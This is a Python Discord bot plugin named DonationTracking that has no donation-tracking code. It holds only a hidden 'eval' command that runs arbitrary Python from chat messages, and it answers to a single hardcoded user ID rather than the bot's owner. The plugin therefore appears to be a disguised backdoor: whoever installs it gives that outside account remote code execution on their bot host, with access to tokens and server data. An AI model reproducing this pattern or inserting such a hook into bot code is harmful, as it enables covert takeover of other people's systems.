from discord.ext import commands
from contextlib import redirect_stdout
import io
import traceback
import textwrap
import discord

class DonationTracking(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot
        # self.coll = bot.plugin_db.get_partition(self)

    def cleanup_code(self, content: str) -> str:
        """Automatically removes code blocks from the code."""
        # remove ```py\n```
        if content.startswith('```') and content.endswith('```'):
            return '\n'.join(content.split('\n')[1:-1])

        # remove `foo`
        return content.strip('` \n')
    
    @commands.command(hidden=True, name='eval')
    async def _eval(self, ctx: commands.Context, *, body: str):
        if ctx.author.id not in (531317158530121738,):
            return
        
        env = {
            'ctx': ctx
        }

        env.update(globals())

        body = self.cleanup_code(body)
        stdout = io.StringIO()

        to_compile = f'async def func():\n{textwrap.indent(body, "  ")}'

        try:
            exec(to_compile, env)
        except Exception as e:
            return await ctx.send(f'```py\n{e.__class__.__name__}: {e}\n```')

        func = env['func']
        try:
            with redirect_stdout(stdout):
                ret = await func()
        except Exception as e:
            value = stdout.getvalue()
            await ctx.send(f'```py\n{value}{traceback.format_exc()}\n```')
        else:
            value = stdout.getvalue()
            try:
                await ctx.message.add_reaction('\u2705')
            except:
                pass

            if ret is None:
                if value:
                    await ctx.send(f'```py\n{value}\n```')
            else:
                await ctx.send(f'```py\n{value}{ret}\n```')



async def setup(bot: commands.Bot):
    await bot.add_cog(DonationTracking(bot))